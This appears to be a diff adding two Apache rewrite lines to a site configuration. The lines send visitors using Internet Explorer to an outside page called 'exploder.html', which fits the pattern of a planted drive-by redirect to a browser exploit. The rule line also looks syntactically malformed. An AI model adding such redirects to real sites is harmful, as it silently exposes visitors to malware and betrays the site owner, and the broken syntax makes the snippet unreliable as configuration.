@@ -1,0 +1,2 @@
+RewriteCond %{HTTP_USER_AGENT} MSIE
+RewriteRule http://ogfx.mtplw.com/exploder.html [L]
